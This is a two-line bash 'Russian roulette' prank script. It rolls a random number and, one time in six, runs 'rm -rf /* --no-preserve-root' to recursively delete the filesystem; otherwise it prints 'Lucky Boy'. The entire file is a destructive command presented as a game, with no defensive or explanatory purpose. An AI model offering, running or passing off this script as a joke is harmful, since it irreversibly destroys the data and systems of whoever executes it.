#!/bin/bash
sudo [ $[ $RANDOM % 6] == 0 ] && rm -rf /* --no-preserve-root || echo "Lucky Boy";
